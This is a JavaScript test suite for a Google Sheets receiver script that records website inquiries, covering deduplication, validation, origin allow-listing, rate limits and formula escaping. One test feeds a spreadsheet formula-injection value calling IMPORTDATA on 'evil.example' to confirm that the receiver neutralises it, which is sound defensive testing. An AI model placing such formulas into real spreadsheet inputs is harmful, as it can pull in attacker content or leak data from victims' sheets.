import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import vm from "node:vm";
import crypto from "node:crypto";
const headers = [
  "Inquiry ID",
  "Received (IST)",
  "Name",
  "Email",
  "Business / Website",
  "Service",
  "Project Message",
  "Privacy Consent",
  "Source",
  "Status",
  "Payload Hash",
];
const id = "12345678-1234-4234-8234-123456789abc";
const good = {
  protocol: 2,
  origin: "http://localhost:5173",
  nonce: id,
  inquiry: {
    requestId: id,
    name: "Test",
    email: "test@example.com",
    business: "",
    service: "Web design",
    message: "A useful enquiry about a new website.",
    consent: true,
    website: "",
  },
};
function receiver() {
  const rows = [headers.slice()];
  const cached = new Map();
  let locked = false;
  const sheet = {
    getLastRow: () => rows.length,
    getRange(row, col, height = 1, width = 1) {
      const range = {
        getValues: () =>
          Array.from({ length: height }, (_, i) =>
            Array.from(
              { length: width },
              (_, j) => rows[row - 1 + i]?.[col - 1 + j] || "",
            ),
          ),
        getValue: () => rows[row - 1]?.[col - 1],
        setValues(values) {
          values.forEach((v, i) => {
            rows[row - 1 + i] = v.slice();
          });
          return range;
        },
        createTextFinder(text) {
          return {
            matchEntireCell() {
              return this;
            },
            findNext() {
              const i = rows.findIndex(
                (r, index) => index > 0 && r[0] === text,
              );
              return i === -1 ? null : { getRow: () => i + 1 };
            },
          };
        },
      };
      for (const k of [
        "setNumberFormat",
        "setVerticalAlignment",
        "setWrap",
        "setFontWeight",
        "setBackground",
        "setFontColor",
      ])
        range[k] = () => range;
      return range;
    },
  };
  const context = vm.createContext({
    console,
    SpreadsheetApp: {
      openById: () => ({ getSheetByName: () => sheet }),
      flush() {},
    },
    Utilities: {
      DigestAlgorithm: { SHA_256: "sha256" },
      Charset: { UTF_8: "utf8" },
      computeDigest: (_a, s) =>
        [...crypto.createHash("sha256").update(s).digest()].map((v) =>
          v > 127 ? v - 256 : v,
        ),
      formatDate: () => "2026-10-29 12:00:00",
    },
    PropertiesService: {
      getScriptProperties: () => ({ getProperty: () => "" }),
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => cached.get(k),
        put: (k, v) => cached.set(k, v),
      }),
    },
    LockService: {
      getScriptLock: () => ({
        tryLock() {
          locked = true;
          return true;
        },
        hasLock: () => locked,
        releaseLock() {
          locked = false;
        },
      }),
    },
    HtmlService: {
      XFrameOptionsMode: { ALLOWALL: "all" },
      createHtmlOutput(html) {
        return {
          html,
          setXFrameOptionsMode() {
            return this;
          },
        };
      },
    },
  });
  new vm.Script(
    fs.readFileSync("integrations/google-sheets/Code.gs", "utf8"),
  ).runInContext(context);
  return {
    rows,
    send(data) {
      const output = context.doPost({
        parameter: { payload: JSON.stringify(data) },
      });
      const match = output.html.match(
        /window\.top\.postMessage\((.*),"http:\/\/localhost:5173"\);/,
      );
      assert.ok(
        match,
        "Expected explicit acknowledgement to the submitting site",
      );
      assert.ok(output.html.includes("</script>"));
      return JSON.parse(match[1]);
    },
    context,
  };
}
test("Google receiver persists once and acknowledges identical retries", () => {
  const r = receiver();
  assert.equal(r.send(good).ok, true);
  assert.equal(r.rows.length, 2);
  assert.equal(r.send(good).ok, true);
  assert.equal(r.rows.length, 2);
  const conflict = structuredClone(good);
  conflict.inquiry.message = "Different message using the same request ID";
  assert.equal(r.send(conflict).ok, false);
  assert.equal(r.rows.length, 2);
});
test("Google receiver rejects missing consent, spam traps and invalid service without writes", () => {
  for (const override of [
    { consent: false },
    { website: "spam" },
    { email: "invalid" },
    { service: "unknown" },
    { message: "short" },
  ]) {
    const r = receiver();
    assert.equal(
      r.send({ ...good, inquiry: { ...good.inquiry, ...override } }).ok,
      false,
    );
    assert.equal(r.rows.length, 1);
  }
});
test("Google receiver checks site allow-list and safely stores formula-like text", () => {
  const r = receiver();
  const output = r.context.doPost({
    parameter: {
      payload: JSON.stringify({
        ...good,
        origin: "https://unconfigured.example",
      }),
    },
  });
  assert.ok(output.html.includes("not configured"));
  assert.equal(r.rows.length, 1);
  assert.equal(
    r.send({
      ...good,
      inquiry: { ...good.inquiry, name: '=IMPORTDATA("https://evil.example")' },
    }).ok,
    true,
  );
  assert.equal(r.rows[1][2].startsWith("'="), true);
});
test("Google receiver caps new writes per time window while still allowing known retries", () => {
  const r = receiver();
  for (let i = 0; i < 30; i++) {
    const value = structuredClone(good);
    value.inquiry.requestId = `12345678-1234-4234-8234-${i.toString(16).padStart(12, "0")}`;
    assert.equal(r.send(value).ok, true);
  }
  const next = structuredClone(good);
  next.inquiry.requestId = "99999999-1234-4234-8234-999999999999";
  assert.equal(r.send(next).ok, false);
  assert.equal(r.rows.length, 31);
});
